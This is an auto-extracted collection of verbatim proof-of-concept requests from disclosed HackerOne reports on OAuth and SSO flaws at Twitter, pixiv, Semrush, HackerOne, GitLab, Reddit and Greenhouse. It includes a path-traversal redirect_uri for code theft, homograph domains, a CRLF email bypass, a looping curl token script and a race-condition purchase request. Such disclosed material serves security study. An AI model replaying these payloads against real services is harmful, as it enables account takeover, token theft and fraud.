# OAuth / SSO — verbatim payloads/PoC snippets from disclosed HackerOne reports

Auto-extracted 2026-11-12 from `data/h1` (code blocks and raw HTTP requests in the reporter's own text). Top reports by bounty, then votes. Full context: the linked report file.

## #168538 Twitter iOS fails to validate server certificate and sends oauth token — x — $2,100 — Cryptographic Issues - Generic
Source: `hackerone/reports/2016/168538.md` (https://hackerone.com/reports/168538)

```
GET /1.1/help/settings.json?include_zero_rate=true&settings_version=8910e1e75c037c3c6b59c64b477b0741 HTTP/1.1
Host: api.twitter.com
█████████
X-Twitter-Client-Version: 6.62
X-Twitter-Polling: true
X-Client-UUID: D8AB1681-1618-48BA-9EB0-F3628DF1660B
X-Twitter-Client-Language: de
X-B3-TraceId: cc8ac1aea2ba5628
x-spdy-bypass: 1
Accept: */*
Accept-Language: de
Accept-Encoding: gzip, deflate
X-Twitter-Client-DeviceID: 68715C92-258F-4C59-A0B4-B98AF8B976BC
User-Agent: Twitter-iPhone/6.62 iOS/9.3.3 (Apple;iPhone8,1;;;;;1)
Connection: close
X-Twitter-API-Version: 5
X-Twitter-Client-Limit-Ad-Tracking: 1
X-Twitter-Client: Twitter-iPhone
```

```
GET /1.1/help/settings.json?include_zero_rate=true&settings_version=8910e1e75c037c3c6b59c64b477b0741 HTTP/1.1
Host: api.twitter.com
█████████
X-Twitter-Client-Version: 6.62
X-Twitter-Polling: true
X-Client-UUID: D8AB1681-1618-48BA-9EB0-F3628DF1660B
X-Twitter-Client-Language: de
X-B3-TraceId: 796651628eef7eed
x-spdy-bypass: 1
Accept: */*
Accept-Language: de
Accept-Encoding: gzip, deflate
X-Twitter-Client-DeviceID: 68715C92-258F-4C59-A0B4-B98AF8B976BC
User-Agent: Twitter-iPhone/6.62 iOS/9.3.3 (Apple;iPhone8,1;;;;;1)
Connection: close
X-Twitter-API-Version: 5
X-Twitter-Client-Limit-Ad-Tracking: 1
X-Twitter-Client: Twitter-iPhone
```

## #1861974 Stealing Users OAuth authorization code via redirect_uri — pixiv — $2,000 — Improper Authorization
Source: `hackerone/reports/2023/1861974.md` (https://hackerone.com/reports/1861974)

```
https://oauth.secure.pixiv.net/v2/auth/authorize?client_id=a1Z7w6JssUQkw5Hid0uIDeuesue9&redirect_uri=https%3A%2F%2Fbooth.pm%2Fusers%2Fauth%2Fpixiv%2Fcallback&response_type=code&scope=read-works+read-favorite-users+read-friends+read-profile+read-email+write-profile&state=%3A1a38b53563599621ce25094661b1c4458ddb52d79d771149
```

```
redirect_uri=https%3A%2F%2Fbooth.pm%2Fusers%2Fauth%2Fpixiv%2Fcallback/../../../../ja/items/4503924
```

```
https://oauth.secure.pixiv.net/v2/auth/authorize?client_id=a1Z7w6JssUQkw5Hid0uIDeuesue9&redirect_uri=https%3A%2F%2Fbooth.pm%2Fusers%2Fauth%2Fpixiv%2Fcallback/../../../../ja/items/[attacker's product id]&response_type=code&scope=read-works+read-favorite-users+read-friends+read-profile+read-email+write-profile&state=%3A1a38b53563599621ce25094661b1c4458ddb52d79d771149
```

## #861940 OAuth `redirect_uri` bypass using IDN homograph attack resulting in user's access token leakage — semrush — - — Information Disclosure
Source: `hackerone/reports/2020/861940.md` (https://hackerone.com/reports/861940)

```
- sémrush.com
- sêmrush.com
- sèmrûsh.com
- šemrush.com
- etc.
```

```
https://oauth.semrush.com/oauth2/authorize?response_type=code&scope=user.info,projects.info,siteaudit.info&client_id=seoquake&redirect_uri=https://oauth.šemrush.com/oauth2/success
```

## #2101076 HackerOne SAML signup domain enforcement bypass results in unauthorized access to HackerOne PullRequest organization — security — - — Improper Null Termination
Source: `hackerone/reports/2024/2101076.md` (https://hackerone.com/reports/2101076)

```
POST /users HTTP/1.1
Host: hackerone.com
...

user%5Bname%5D=[NAME]&user%5Busername%5D=[USERNAME]&user%5Bemail%5D=email%40example.com&user%5Bpassword%5D=[PASSWORD]&user%5Bpassword_confirmation%5D=[PASSWORD]
```

```
{"redirect_path":"/users/saml/sign_in?email=email%40example.com"}
```

```
POST /users HTTP/1.1
Host: hackerone.com
...

user%5Bname%5D=[NAME]&user%5Busername%5D=[USERNAME]&user%5Bemail%5D=email%40example.com%0d%0a&user%5Bpassword%5D=[PASSWORD]&user%5Bpassword_confirmation%5D=[PASSWORD]
```

## #2676025 Login email verification bypass via `/oauth/token`. — gitlab — - — Missing Critical Step in Authentication
Source: `hackerone/reports/2024/2676025.md` (https://hackerone.com/reports/2676025)

```
{"error":"invalid_grant","error_description":"The provided authorization grant is invalid, expired, revoked, does not match the redirection URI used in the authorization request, or was issued to another client."}
```

```
#!/usr/bin/sh

USERNAME=gitlab_username
PASSWORD=gitlab_password

while true
do
curl --data "grant_type=password&username=$USERNAME&password=$PASSWORD&scope=api" \
     --request POST "https://gitlab.com/oauth/token"

    echo ''

    sleep 1.5
done
```

```
     --request POST "https://gitlab.com/oauth/token"
```

## #801743 Race condition leads to Inflation of coins when bought via Google Play Store at endpoint https://oauth.reddit.com/api/v2/gold/android/verify_purchase  — reddit — - — Time-of-check Time-of-use (TOCTOU) Race Condition
Source: `hackerone/reports/2021/801743.md` (https://hackerone.com/reports/801743)

```
POST /api/v2/gold/android/verify_purchase?raw_json=1&feature=link_preview&sr_detail=true&expand_srs=true&from_detail=true&api_type=json&raw_json=1&always_show_media=1&request_timestamp=1582296187715 HTTP/1.1
Authorization: Bearer REDACTED
Client-Vendor-ID: REDACTED
x-reddit-device-id: REDACTED
User-Agent: Reddit/Version 2020.5.0/Build 255357/Android 9
X-Dev-Ad-Id: REDACTED
x-reddit-session: REDACTED
x-reddit-loid: REDACTED
x-reddaid: REDACTED
Content-Type: application/x-www-form-urlencoded
Content-Length: 327
Host: oauth.reddit.com
Connection: keep-alive
Accept-Encoding: gzip, deflate

transaction_id=GPA.3390-9967-2355-57063&token=effmpcoplmjonhljkheipnce.AO-J1OyQ3ZXb7XM7JwoJPJqpNP3LgWYqHYUUmOE7o5hCzQtf4TC8GL0i71zvRVeZKl-I5rlQCfM0ID3Z0P8CTFSUmhbdbPvQwOIN0164LBE647_lDvB9aHzk2naeC59hSFrtJJYkYj2b&package_name=com.reddit.frontpage&product_id=com.reddit.coins_1&correlation_id=394e65c9-5f9d-45e7-a9b4-498ed64251cd
```

## #315205 Debug information disclosure on oauth-redirector.services.greenhouse.io — greenhouse — - — Information Exposure Through Debug Information
Source: `hackerone/reports/2020/315205.md` (https://hackerone.com/reports/315205)

```
GET /integrations/oauth/create?state=x&code=x HTTP/1.1
Host: oauth-redirector.services.greenhouse.io
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: oauth_redirect_uri=https%3A%2F%2Fapp.<x>greenhouse.io%2Fusers%2Fauth%2Fgoogle_oauth2%2Fcallback
Connection: close
```

```
GET /integrations/oauth/create?state=x&code=x HTTP/1.1
Host: oauth-redirector.services.greenhouse.io
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: oauth_redirect_uri=https%3A%2F%2Fapp.<x>greenhouse.io%2Fusers%2Fauth%2Fgoogle_oauth2%2Fcallback
Connection: close

'''
```

